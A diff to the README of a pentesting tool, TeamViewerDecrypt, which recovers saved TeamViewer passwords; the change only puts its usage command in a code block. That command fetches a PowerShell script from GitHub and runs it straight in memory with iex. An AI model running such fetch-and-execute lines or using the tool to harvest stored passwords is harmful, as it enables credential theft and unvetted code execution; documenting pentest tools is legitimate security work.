@@ -7,7 +7,9 @@ All credit goes to him, blog post can be found here: https://whynotsecurity.com/
 Not all passwords in every version can be decrypted using this script. I could not decrypt Teamviewer v14/v15 PermanentPasswords so far.
 
 Usage as simple as:
-iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1');TeamviewerDecrypt
 
+```
+iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1');TeamviewerDecrypt
+```
 
 As always only use for educational or pentesting purposes. :)
